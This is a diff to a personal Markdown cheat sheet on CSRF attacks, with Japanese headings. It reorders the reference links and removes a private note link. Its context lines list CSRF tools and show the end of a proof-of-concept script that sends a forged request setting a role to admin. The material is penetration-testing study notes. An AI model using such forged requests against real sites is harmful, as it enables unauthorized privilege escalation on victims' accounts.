@@ -1,6 +1,4 @@
-# # 参考文献
-- https://github.com/six2dez/pentest-book/blob/master/enumeration/web/csrf.md
-- [自分で作ったヤツ](obsidian://open?vault=CheatSheet&file=%E5%AD%A6%E7%BF%92%E9%80%B2%E6%8D%97%E7%AE%A1%E7%90%86%2FPortSwigger%2F%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E8%AA%AC%E6%98%8E%2FCross%20site%20Request%20Forgery%20(CSRF))
+
 # # Tools
 - https://github.com/0xInfection/XSRFProbe
 - https://github.com/0xInfection/CSRFPocGenerator.git
@@ -43,3 +41,6 @@ xhr.setRequestHeader("Content-Type", "text/plain");
 xhr.send('{"role":admin}');
 </script>
 ```
+
+# # 参考文献
+- https://github.com/six2dez/pentest-book/blob/master/enumeration/web/csrf.md
